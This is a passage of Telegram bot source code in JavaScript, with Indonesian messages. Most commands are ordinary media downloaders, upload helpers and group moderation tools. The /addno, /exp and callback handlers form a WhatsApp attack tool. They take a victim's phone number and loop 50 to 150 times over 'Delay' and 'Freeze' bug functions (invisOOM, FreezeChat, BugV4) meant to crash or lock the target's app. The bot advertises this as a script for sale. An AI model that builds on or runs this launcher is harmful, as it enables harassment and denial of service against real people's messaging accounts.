      {
        title: song.title,
        performer: song.artist
      }
    )

    await ctx.deleteMessage(msg.message_id).catch(() => {})

  } catch (e) {
    console.error(e)
    ctx.reply("❌ Terjadi error")
  }
});
bot.command('tourl', async (ctx) => {
    const message = ctx.message.reply_to_message;
    const userId = ctx.from.id;

    if (!message || (!message.photo && !message.video && !message.document)) {
        return ctx.reply('❌ Silakan reply foto/video/file dengan command /tourl', {
            reply_to_message_id: ctx.message.message_id
        });
    }

    uploadCache[userId] = message.photo 
        ? message.photo[message.photo.length - 1].file_id 
        : (message.video?.file_id || message.document?.file_id);

    return ctx.reply('🌐 **Pilih Host Upload:**', {
        reply_to_message_id: ctx.message.message_id,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [
                Markup.button.callback('📦 Catbox', 'upl_catbox'),
                Markup.button.callback('💧 Uguu', 'upl_uguu')
            ],
            [
                Markup.button.callback('🚀 Ikyy CDN', 'upl_cdn')
            ]
        ])
    });
});
bot.action(/^upl_(catbox|uguu|cdn)$/, async (ctx) => {
    const host = ctx.match[1];
    const userId = ctx.from.id;    
    const fileId = uploadCache[userId];

    if (!fileId) {
        return ctx.answerCbQuery('❌ Sesi kadaluarsa!', { show_alert: true });
    }

    try {
        await ctx.answerCbQuery(`Mengunggah ke ${host}...`);
        await ctx.editMessageText(`⏳ Memproses file untuk **${host.toUpperCase()}**...`, { parse_mode: 'Markdown' });

        const fileLink = await ctx.telegram.getFileLink(fileId);
        const responseFile = await axios.get(fileLink.href, { responseType: 'stream' });
        const fileName = fileLink.href.split('/').pop();

        const form = new FormData();
        form.append('file', responseFile.data, fileName);

        const { data } = await axios.post(`https://api.ikyyxd.my.id/uploads?host=${host}`, form, {
            headers: { ...form.getHeaders() }
        });

        if (data.status) {
            let finalUrl = '';
            
            if (host === 'catbox') finalUrl = data.result;
            else if (host === 'uguu') finalUrl = data.result?.files?.[0]?.url;
            else if (host === 'cdn') finalUrl = data.result?.url;

            delete uploadCache[userId];

            return ctx.editMessageText(`✅ **Berhasil Diupload!**\n\n🌐 **Host:** ${host.toUpperCase()}\n🔗 **URL:** \`${finalUrl}\``, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.url('Buka Link', finalUrl)]
                ])
            });
        } else {
            throw new Error(data.error || 'API Respon Gagal');
        }

    } catch (err) {
        console.error(err);
        const errMsg = err.response?.data?.error || err.message;
        return ctx.editMessageText(`❌ **Gagal:** ${errMsg}`);
    }
});
bot.command("tiktok", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];

  if (!url) {
    return ctx.reply("Masukkan URL TikTok!\nContoh: /tiktok https://vt.tiktok.com/abc");
  }
  const key = Date.now().toString();
  memory[key] = { url };
  await ctx.reply("Pilih versi API TikTok:", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "V1 [ Support Slide ]", callback_data: `ttv1_${key}`, style: "primary" }],
        [{ text: "V2 [ Support Slide ]", callback_data: `ttv2_${key}`, style: "success" }],
        [{ text: "V3 [ No Support ]", callback_data: `ttv3_${key}`, style: "danger" }],
        [{ text: "V4 [ No Support ]", callback_data: `ttv4_${key}`, style: "primary" }]
      ]
    }
  });
});

bot.action(/tt(v1|v2|v3|v4)_(.+)/, async (ctx) => {
  const [, version, key] = ctx.match;
  const saved = memory[key];
  if (!saved) return ctx.answerCbQuery("Data tidak ditemukan!");

  await ctx.answerCbQuery(`Processing TikTok ${version.toUpperCase()}...`);
  await ctx.editMessageText(`⏳ Memproses TikTok ${version.toUpperCase()}...`);

  try {
    let res;
    if (version === "v4") {
      const { data } = await axios.get(
        `https://tikdown.ikyzxz.my.id/api/v1`,
        { params: { url: saved.url } }
      );
      if (!data.status) throw new Error("Download V4 gagal");
      res = data;
      const caption = `
🎵 TikTok Downloader V4

📌 Title : ${res.title || "No Title"}
👤 Author : ${res.author || "Unknown"}
`;
      if (res.download?.nowm) {
        await ctx.replyWithVideo(res.download.nowm, {
          caption: "🎬 Video No Watermark"
        });
      }

      else if (res.download?.wm) {
        await ctx.replyWithVideo(res.download.wm, {
          caption: "🎬 Video (Watermark)"
        });
      }
      if (res.download?.mp3) {
        await ctx.replyWithAudio(
          {
            url: res.download.mp3,
            filename: "tiktok.mp3"
          },
          {
            title: res.title || "TikTok Audio",
            performer: res.author || "TikTok"
          }
        );
      }
    }
    else if (version === "v1") {
      const { data } = await axios.get(
        `https://api.ikyyxd.my.id/download/tiktok`,
        { params: { apikey: "kyzz", query: saved.url } }
      );
      if (!data.status) throw new Error("Download V1 gagal");
      res = data.result;
      const media = [];

      if (res.video) {
        media.push({ type: "video", media: res.video, caption: "🎵 TikTok Video" });
      }

      if (res.slides?.length) {
        res.slides.forEach((sl, idx) => {
          media.push({
            type: "photo",
            media: sl.img_result,
            caption: idx === 0 && !res.video ? "🎵 TikTok Slide" : undefined
          });
        });
      }

      for (let i = 0; i < media.length; i += 10) {
        const batch = media.slice(i, i + 10);

        if (batch.length === 1) {
          if (batch[0].type === "video") {
            await ctx.replyWithVideo(batch[0].media, { caption: batch[0].caption });
          } else {
            await ctx.replyWithPhoto(batch[0].media, { caption: batch[0].caption });
          }
        } else {
          await ctx.replyWithMediaGroup(
            batch.map(m => ({
              type: m.type,
              media: m.media,
              caption: m.caption
            }))
          );
        }
      }

      if (res.audio) {
        await ctx.replyWithAudio(res.audio, { caption: "🎵 Audio TikTok" });
      }
    }

    else if (version === "v2") {
      const { data } = await axios.get(
        `https://api.ikyyxd.my.id/download/tiktokv2`,
        { params: { url: saved.url } }
      );

      if (!data.status) throw new Error("Download V2 gagal");

      res = data.result;

      const media = [];

      res.video?.forEach(v => media.push({ type: "video", media: v }));
      res.audio?.forEach(a => media.push({ type: "audio", media: a }));

      const caption = res.title ? `🎵 ${res.title}` : undefined;

      const videos = media.filter(m => m.type === "video");

      if (videos.length > 0) {
        for (let i = 0; i < videos.length; i += 10) {
          const slice = videos.slice(i, i + 10);
          await ctx.replyWithMediaGroup(
            slice.map((m, idx) => ({
              type: "video",
              media: m.media,
              caption: i === 0 && idx === 0 ? caption : undefined
            }))
          );
        }
      }

      const audios = media.filter(m => m.type === "audio");
      for (const a of audios) await ctx.replyWithAudio(a.media);
    }

    else if (version === "v3") {
      const { data } = await axios.get(
        `https://www.tikwm.com/api/`,
        { params: { url: saved.url } }
      );

      if (data.code !== 0) throw new Error("Download V3 gagal");

      res = data.data;

      const caption = `
🎵 TikTok Downloader

👤 Author : ${res.author.nickname}
📌 Title : ${res.title || "No Title"}
❤️ Likes : ${res.digg_count}
💬 Comments : ${res.comment_count}
🔁 Share : ${res.share_count}
`;

      await ctx.replyWithVideo(res.play, { caption });

      if (res.music) {
        await ctx.replyWithAudio(
          { url: res.music, filename: "tiktok.mp3" },
          {
            title: res.music_info?.title || "TikTok Audio",
            performer: res.music_info?.author || "TikTok",
            thumb: { url: res.music_info?.cover }
          }
        );
      }
    }

    await ctx.editMessageText(`✅ TikTok ${version.toUpperCase()} berhasil dikirim!`);

  } catch (err) {
    console.error(err);
    await ctx.editMessageText(`❌ Gagal download TikTok ${version.toUpperCase()}`);
  }

  delete memory[key];
});
bot.command("ig", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ")
    if (!args[1]) {
      return ctx.reply(
        "❌ Contoh penggunaan:\n/ig https://www.instagram.com/reel/xxxx"
      )
    }

    const igUrl = args[1]
    await ctx.reply("⏳ Mengambil data reels Instagram...")

    const api = `https://api.ryzendesu.vip/api/downloader/igdl?url=${encodeURIComponent(igUrl)}`
    const res = await fetch(api)
    const json = await res.json()

    if (!json.status || !json.data?.length) {
      return ctx.reply("❌ Gagal mengambil data reels")
    }

    const video = json.data.find(v => v.type === "video") || json.data[0]
    const audio = json.data.find(v => v.type === "audio")

    await ctx.replyWithVideo(
      { url: video.url },
      {
        caption:
`✅ *Reels berhasil diunduh*

📹 Quality: ${video.quality || "default"}
🎵 Sound: ${audio ? "Tersedia" : "Tidak tersedia"}

© Xtrovie X Gen Bot`,
        parse_mode: "Markdown"
      }
    )

    if (audio?.url) {
      await ctx.replyWithAudio(
        { url: audio.url },
        {
          title: "Instagram Reels Audio",
          performer: "Instagram",
          caption: "🎵 Sound dari Reels"
        }
      )
    }

  } catch (err) {
    console.error(err)
    ctx.reply("❌ Terjadi kesalahan saat mengambil reels")
  }
})

bot.command('ping', async (ctx) => {
 const os = require('os');
  const start = Date.now();
  const msg = await ctx.reply('⚡ Checking...');
  const latency = Date.now() - start;

  const uptime = process.uptime();
  const memoryUsage = process.memoryUsage();
  const cpuLoad = os.loadavg();

  const text = `
<blockquote>Xtrovie X Gen Bot Latency</blockquote>

⏱ <b>Latency:</b> ${latency} ms
🕒 <b>Uptime:</b> ${Math.floor(uptime)} s
💾 <b>Memory:</b> ${(memoryUsage.heapUsed / 1024 / 1024).toFixed(2)} MB
⚙️ <b>CPU Load:</b> ${cpuLoad.map(v => v.toFixed(2)).join(' | ')}
`;

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    null,
    text,
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: "ʙᴜʏ ᴍᴜʀʙᴜɢ/sᴄʀɪᴘᴛ", url: "https://t.me/ryszox" }]
        ]
      }
    }
  );
});

//##############################
bot.command("addno", async (ctx) => {
const args = ctx.message.text.split(" ");
 if (args.length < 2) { return await ctx.reply(`
<blockquote>Bot pairing status</blockquote>
example: /addno 62xxxx`, { parse_mode: "HTML" });
}

  const BotNumber = args[1];
   await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
    await WaConnect(BotNumber, ctx.chat.id, ctx);
});
    
bot.command("listno", OwnerCheck, async (ctx) => {
   if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delno", OwnerCheck, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delno 628xxxx");
  
  const number = args[1];
   if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");
   
   try {
    const sessionDir = SaveSession(number);
     sessions.get(number).end(); 
     sessions.delete(number);
     fs.rmSync(sessionDir, { recursive: true, force: true });
     
     const data = JSON.parse(fs.readFileSync(FileSession));
     const updated = data.filter(n => n !== number);
     fs.writeFileSync(FileSession, JSON.stringify(updated));
     ctx.reply(`Sender ${number} berhasil dihapus.`);
   } catch (err) {
    console.error(err);
  }
});
//##############################
bot.command('cekid', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  let targetUser;

  if (args.length === 0) {
    targetUser = ctx.from;
  } else {
    const input = args[0];
    try {
      if (input.startsWith('@')) {
        const member = await ctx.telegram.getChatMember(ctx.chat.id, input.replace('@', ''));
        targetUser = member.user;
      } else {
        const member = await ctx.telegram.getChatMember(ctx.chat.id, parseInt(input));
        targetUser = member.user;
      }
    } catch (err) {
      return ctx.reply('❌ User tidak ditemukan atau bukan member group.');
    }
  }

  const id = targetUser.id;
  const firstName = targetUser.first_name || '';
  const lastName = targetUser.last_name || '';
  const username = targetUser.username ? `@${targetUser.username}` : '-';
  const bio = targetUser.bio || '-';

  const caption = 
`
<blockquote>─(⚡) Informasi User
⚡UserID: 
👤Name: <code>${id}</code>
🪢Username: ${firstName} ${lastName}
🔮Bio: ${bio}
💎Status: ${murbugUser ? "Premium" : "Free"}

© Xtrovie X Gen Bot
</blockquote>
`;

  try {
    const photos = await ctx.telegram.getUserProfilePhotos(targetUser.id);
    if (photos.total_count > 0) {
      const fileId = photos.photos[0][0].file_id;
      await ctx.replyWithPhoto(fileId, {
        caption,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
               {
                 text: "Copy ID",
                 copy_text: { text: `${id}`
                 }
               }
            ]
          ]
        }
      });
    } else {
      await ctx.reply(caption, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
               {
                 text: "Copy ID",
                 copy_text: { text: `${id}`
                 }
               }
            ]
          ]
        }
      });
    }
  } catch (err) {
    console.error(err);
    await ctx.reply(caption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [
               {
                 text: "Copy ID",
                 copy_text: { text: `${id}`
                 }
               }
            ]
        ]
      }
    });
  }
});
bot.command('iqc', async (ctx) => {
  const text = ctx.message.text.replace('/iqc', '').trim();

  if (!text) {
    return ctx.reply('❌ Format Salah: /iqc jam|batre|carrier|pesan\nContoh: /iqc 18:00|40|Indosat|hai hai', {
      reply_to_message_id: ctx.message.message_id
    });
  }

  const parts = text.split('|');
  if (parts.length < 4) {
    return ctx.reply('❌ Format salah! Gunakan:\n/iqc jam|batre|carrier|pesan\nContoh:\n/iqc 18:00|40|Indosat|hai hai', {
      reply_to_message_id: ctx.message.message_id
    });
  }

  const time = parts[0].trim();
  const battery = parts[1].trim();
  const carrier = parts[2].trim();
  const messageParts = parts.slice(3);
  const messageText = messageParts.join('|').trim();

  if (!time || !battery || !carrier || !messageText) {
    return ctx.reply('⚠️ Format salah! Pastikan semua field terisi:\n/iqc jam|batre|carrier|pesan', {
      reply_to_message_id: ctx.message.message_id
    });
  }

  const waitingMsg = await ctx.reply('⏳', { reply_to_message_id: ctx.message.message_id });

  try {
    const encodedTime = encodeURIComponent(time);
    const encodedCarrier = encodeURIComponent(carrier);
    const encodedMessage = encodeURIComponent(messageText);

    const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodedTime}&batteryPercentage=${battery}&carrierName=${encodedCarrier}&messageText=${encodedMessage}&emojiStyle=apple`;

    const response = await fetch(url);

    if (!response.ok) {
      throw new Error(`API returned status ${response.status}`);
    }

    const arrayBuffer = await response.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ *ꜱᴜᴋꜱᴇꜱ ʙᴀɴɢ*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });

    await ctx.deleteMessage(waitingMsg.message_id);

  } catch (error) {
    console.error('Error:', error);

    await ctx.deleteMessage(waitingMsg.message_id);

    await ctx.reply('❌ Terjadi kesalahan, Coba lagi!', {
      reply_to_message_id: ctx.message.message_id
    });
  }
});
bot.command('cekerror', async (ctx) => {
  try {
    const replyMsg = ctx.message.reply_to_message;

    if (!replyMsg) {
      return ctx.reply("❌ Harus reply ke file .js atau teks function.");
    }

    let code;

    // Jika reply ke file .js
    if (replyMsg.document) {
      const fileName = replyMsg.document.file_name || "";
      if (!fileName.endsWith(".js")) {
        return ctx.reply("❌ File harus berekstensi .js");
      }

      const fileId = replyMsg.document.file_id;
      const fileLink = await ctx.telegram.getFileLink(fileId);
      const response = await fetch(fileLink.href);
      code = await response.text();
    }

    else if (replyMsg.text) {
      code = replyMsg.text;
    }

    if (!code) {
      return ctx.reply("❌ Tidak ada kode yang bisa dicek.");
    }

    try {
      new Function(code);
      await ctx.reply("✅ Tidak ada error syntax.", { parse_mode: "Markdown" });
    } catch (err) {
      const message = err.message;
      const stack = err.stack;
      const match = stack.match(/<anonymous>:(\d+):(\d+)/);
      if (match) {
        const line = match[1];
        const column = match[2];
        await ctx.reply(
          `❌ *Syntax Error Terdeteksi*\n\n\`\`\`js\n${message}\n\`\`\`\n📍 Lokasi: baris ${line}, kolom ${column}`,
          { parse_mode: "Markdown" }
        );
      } else {
        await ctx.reply(
          `❌ *Syntax Error Terdeteksi*\n\n\`\`\`js\n${message}\n\`\`\``,
          { parse_mode: "Markdown" }
        );
      }
    }

  } catch (err) {
    await ctx.reply(`❌ Terjadi kesalahan:\n\n${err.message}`, { parse_mode: "Markdown" });
  }
});
bot.command('qc', async (ctx) => {
  try {
    if (!ctx.message.reply_to_message) {
      return ctx.reply('❌ Reply ke pesan dulu untuk bikin QC sticker.');
    }

    const reply = ctx.message.reply_to_message;
    const text = reply.text || reply.caption || 'Pesan kosong';
    const username = reply.from.first_name || reply.from.username || 'Anonim';
    
    let avatar;
    try {
      const photos = await ctx.telegram.getUserProfilePhotos(reply.from.id, { limit: 1 });
      if (photos.total_count > 0) {
        const fileId = photos.photos[0][0].file_id;
        const file = await ctx.telegram.getFile(fileId);
        avatar = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
      } else {
        avatar = 'https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png';
      }
    } catch (e) {
      avatar = 'https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png';
    }

    const json = {
      type: 'quote',
      format: 'png',
      backgroundColor: '#FFFFFF',
      width: 512,
      height: 768,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: username,
            photo: { url: avatar },
          },
          text: text,
          replyMessage: {},
        },
      ],
    };

    const res = await axios.post('https://bot.lyo.su/quote/generate', json, {
      headers: { 'Content-Type': 'application/json' },
    });

    const buffer = Buffer.from(res.data.result.image, 'base64');
    await ctx.replyWithSticker({
     source: buffer
    }, {
        reply_to_message_id: ctx.message.reply_to_message.message_id
     });

  } catch (err) {
    console.error(err);
    ctx.reply('❌ Gagal generate QC sticker.');
  }
});
bot.command('fixerror', async (ctx) => {
  try {
    const replyMsg = ctx.message.reply_to_message;

    if (!replyMsg) {
      return ctx.reply("❌ Harus reply ke file .js atau teks function.");
    }

    let code;

    if (replyMsg.document) {
      const fileName = replyMsg.document.file_name || "";
      if (!fileName.endsWith(".js")) {
        return ctx.reply("❌ File harus berekstensi .js");
      }

      const fileId = replyMsg.document.file_id;
      const fileLink = await ctx.telegram.getFileLink(fileId);
      const response = await fetch(fileLink.href);
      code = await response.text();
    }

    // Jika reply ke teks function
    else if (replyMsg.text) {
      code = replyMsg.text;
    }

    if (!code) {
      return ctx.reply("❌ Tidak ada kode yang bisa difix.");
    }

    try {
      new Function(code);
      let fixedCode = prettier.format(code, { parser: "babel" });
      const eslint = new ESLint({ fix: true });
      const results = await eslint.lintText(fixedCode);
      fixedCode = results[0].output || fixedCode;

      await ctx.replyWithDocument(
        { source: Buffer.from(fixedCode), filename: "fixed.js" },
        { caption: "✅ Kode berhasil difix otomatis" }
      );

    } catch (err) {
      await ctx.reply(`❌ Error syntax:\n\n${err.message}\n\nTidak bisa auto-fix.`);
    }

  } catch (err) {
    await ctx.reply(`❌ Terjadi kesalahan:\n\n${err.message}`);
  }
});
//##############################
bot.command('exp', async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    const cmd = args[0];
    const kkk = args[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;

      if (sessions.size === 0)
        return ctx.reply("🚧 Sender belum ada silahkan lakukan addno\nExample: /addno [number].");
      
      if (!kkk) { return ctx.replyWithPhoto({ url: "https://files.catbox.moe/dcnz2q.jpg" },
      { caption: `❌ Contoh:\n<code>${cmd} 628123456789</code>`,
        parse_mode: "HTML"
      }
    );
  }

    const rawTarget = kkk;

  if (!/^\+?\d{7,15}$/.test(rawTarget)) { 
    return ctx.reply(
      `❌ Nomor tidak valid\nContoh:\n<code>${cmd} ${rawTarget}</code>`,
      { parse_mode: "HTML" }
    );
  }
  
  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    userSessions[userId] = {
      target: target,
      rawTarget: rawTarget,
      chatId: chatId
    };

    const pollMsg = await ctx.replyWithPoll(`Target locked\n${target}\n\nPlease select the loop you want `, 
      ["50", "100", "150"],
      { 
        is_anonymous: false,
        allows_multiple_answers: false
      }
    );

    userSessions[userId].pollId = pollMsg.message_id;
  } catch (error) {
    console.error('Error:', error);
    await ctx.reply('❌ Terjadi kesalahan, coba lagi.');
  }
});
bot.on('poll_answer', async (ctx) => {
  try {
    const pollAnswer = ctx.pollAnswer;
    if (!pollAnswer) return;
    
    const userId = pollAnswer.user.id;
    const selectedOption = pollAnswer.option_ids[0];
    const session = userSessions[userId];
    if (!session) return;

    const loopOptions = ["50", "100", "150"];
    const loopCount = loopOptions[selectedOption];
    
    const target = session.target;
    const rawTarget = session.rawTarget;
    const chatId = session.chatId;
    session.loopCount = loopCount;

    try {
      await ctx.telegram.deleteMessage(chatId, session.pollId);
    } catch (err) {
      console.log('Gagal hapus poll:', err.message);
    }

    await ctx.telegram.sendPhoto(chatId, "https://files.catbox.moe/dcnz2q.jpg",
    {
     caption: `\`\`\`js
 Loop locked, select level bugs for
 
const Target = "${rawTarget}";
const Loop = "${loopCount}x";
\`\`\``,
     parse_mode: "Markdown",
     reply_markup: {
      inline_keyboard: [
        [{ text: "🍬 Delay V1", callback_data: `exec_v1_${loopCount}_${rawTarget}`, style: "success" }],
        [{ text: "🍥 Delay V2", callback_data: `exec_v2_${loopCount}_${rawTarget}`, style: "success" }],
        [{ text: "🧊 Freeze V1", callback_data: `exec_v3_${loopCount}_${rawTarget}`, style: "danger" }],
        [{ text: "🍻 Freeze V2", callback_data: `exec_v4_${loopCount}_${rawTarget}`, style: "danger" }]
        ]
      }
    }
  );
 } catch (error) {
   console.error('Poll error:', error);
  }
});
bot.on('callback_query', async (ctx) => {
 try {
  const callbackData = ctx.callbackQuery.data;
  const parts = callbackData.split('_');
  
  if (parts.length < 4) {
   await ctx.answerCbQuery('❌ Data tidak valid');
   return;
  }

    const action = parts[0];
    const type = parts[1];
    const loopCount = parts[2];
    const number = parts.slice(3).join('_');
    let method;
    const target = number.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.answerCbQuery('⏳ Memproses...');

    switch (type) {
      case "v1": method = "🍬 Delay V1"; break;
      case "v2": method = "🍥 Delay V2"; break;
      case "v3": method = "🧊 Freeze V1"; break;
      case "v4": method = "🍻 Freeze V2"; break;
      default: method = "Unknown";
    }

    await ctx.editMessageCaption(`\`\`\`js
 ⏳ Please wait a moment, the bot is executing the target

📱 Target: ${number}
🩸 Type: ${method}
🍬 Loops: ${loopCount}X

⚡ Bug sedang berjalan, tunggu hingga selesai...
\`\`\``,
  {
    parse_mode: "Markdown"
  }
);

    const totalLoops = parseInt(loopCount);
    
    for (let i = 0; i < totalLoops; i++) {
      try {
       switch (type) {
        case "v1":
         method = "🍬 Delay V1";
         await invisOOM(target);
         await OfmSqL(target);
         console.log(chalk.green(`Send Bugs Delay V1 to ${target}`))
        break;
        case "v2":
         method = "🍥 Delay V2";
         await invisOOM(target);
         await annotationz(target);
         await OfmSqL(target);
         await ofmEr(target);
         console.log(chalk.green(`Send Bugs Delay V2 to ${target}`))
        break;
        case "v3":
         method = "🧊 Freeze V1";
         await ChatChat1(target);
         await ChatChat2(target);
         console.log(chalk.green(`Send Bugs Freeze V1 to ${target}`))
        break;
        case "v4":
         method = "🍻 Freeze V2";
         await chatlock(target);
         await FreezeChat(target);
         await BugV4(target);
         console.log(chalk.green(`Send Bugs Freeze V2 to ${target}`))
        break;
       default:
      }
        
        if ((i + 1) % 10 === 0 || i + 1 === totalLoops) {
          await ctx.editMessageCaption(`\`\`\`js
 🪄 Target is still in process

📱 Target: ${number}
🩸 Type: ${method}
🍬 Loops: ${loopCount}X

🧬 Progress: ${i+1}/${totalLoops}
\`\`\``,
            {
              parse_mode: "Markdown"
           });
         }
        
        await new Promise(r => setTimeout(r, 500));
      } catch (err) {
        console.error(`Loop ${i+1} error:`, err);
      }
    }

    await ctx.editMessageCaption(`\`\`\`js
 ✅ Target successfully executed 

📱 Target: ${number}
🩸 Type: ${method}
🍬 Total: ${loopCount}x

🪄⚡ Sekarang bisa lanjut bug lagi
\`\`\``,
    {
      parse_mode: "Markdown"
    }
  );
} catch (error) {
  console.error('Callback error:', error);
   await ctx.answerCbQuery('❌ Error! Coba lagi.');
  }
});
//##############################
bot.on("new_chat_members", async (ctx) => {
  const member = ctx.message.new_chat_members[0];

  await ctx.replyWithPhoto(
    { url: "https://smail.my.id/cloud/Ux4G0Paq1" },
    {
      caption: `
<blockquote>─( 👋 ) Welcome ${member.first_name}

Rules Group - Bot Setting
<b>□ Dilarang Promosi</b>
<b>□ Dilarang Rusuh</b>
<b>□ Dilarang Ripper</b>
<b>□ Dilarang Scam</b>
<b>□ Dilarang Drama</b>
<b>□ Saling Membantu</b>
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/ryszox", style: "success" }]
        ]
      }
    }
  );
});
bot.on("left_chat_member", async (ctx) => {
  const member = ctx.message.left_chat_member;

  await ctx.replyWithPhoto(
    { url: "https://smail.my.id/cloud/SturUnyV1" },
    {
      caption: `👋 Sampai jumpa ${member.first_name}, semoga kita jumpa di lain waktu ya`,
      reply_markup: {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/ryszox", style: "danger" }]
        ]
      }
    }
  );
});
bot.command('promote', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.telegram.promoteChatMember(ctx.chat.id, user.id, { can_manage_chat: true });
    ctx.reply(`✅ ${user.first_name} dipromosikan jadi admin!`);
  }
});

bot.command('demote', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.telegram.promoteChatMember(ctx.chat.id, user.id, { can_manage_chat: false });
    ctx.reply(`❌ ${user.first_name} diturunkan dari admin.`);
  }
});
bot.command('pin', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  if (ctx.message.reply_to_message) {
    await ctx.telegram.pinChatMessage(ctx.chat.id, ctx.message.reply_to_message.message_id);
    ctx.reply('📌 Pesan berhasil di-pin!');
  }
});
bot.command('unpin', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  await ctx.telegram.unpinChatMessage(ctx.chat.id);
  ctx.reply('📌 Pesan unpin!');
});
bot.command('ban', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.kickChatMember(user.id);
    ctx.reply(`🚫 ${user.first_name} dibanned dari grup.`);
  }
});
bot.command('unban', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.unbanChatMember(user.id);
    ctx.reply(`✅ ${user.first_name} di-unban.`);
  }
});
bot.command('mute', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.telegram.restrictChatMember(ctx.chat.id, user.id, { can_send_messages: false });
    ctx.reply(`🔇 ${user.first_name} dimute.`);
  }
});
bot.command('unmute', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.telegram.restrictChatMember(ctx.chat.id, user.id, { can_send_messages: true });
    ctx.reply(`🔊 ${user.first_name} diunmute.`);
  }
});
bot.command('antilink', async (ctx) => {
  if (!(await isAdmin(ctx))) return;

  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (args === 'on') {
    global.antiLink = true;
    ctx.reply('✅ Fitur AntiLink diaktifkan!');
  } else if (args === 'off') {
    global.antiLink = false;
    ctx.reply('❌ Fitur AntiLink dimatikan!');
  } else {
    ctx.reply('Gunakan: /antilink on atau /antilink off');
  }
});

bot.command('antitoxic', async (ctx) => {
  if (!(await isAdmin(ctx))) return;

  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (args === 'on') {
    global.antiToxic = true;
    ctx.reply('✅ Fitur AntiToxic diaktifkan!');
  } else if (args === 'off') {
    global.antiToxic = false;
    ctx.reply('❌ Fitur AntiToxic dimatikan!');
  } else {
    ctx.reply('Gunakan: /antitoxic on atau /antitoxic off');
  }
});
bot.on('message', async (ctx) => {
  const admin = await isAdmin(ctx);
  const text = ctx.message.text?.toLowerCase() || "";

  if (global.antiLink && text.includes('t.me/')) {
    if (!admin) {
      await ctx.deleteMessage();
      await ctx.reply('❌ Link undangan grup tidak diperbolehkan!');
      return;
    }
  }
  if (global.antiToxic && badwords.some(word => text.includes(word))) {
    if (!admin) {
      await ctx.deleteMessage();
      await ctx.reply('⚠️ Bahasa tidak sopan akan dihapus!');
      return;
    }
  }
});
//##############################

bot.launch();
    console.log(`Bot @${bot.botInfo?.username || 'unknown'} aktif dengan owner ${ownerId}`);

    global.Bots.push(bot);
  });
}

module.exports = { startBots };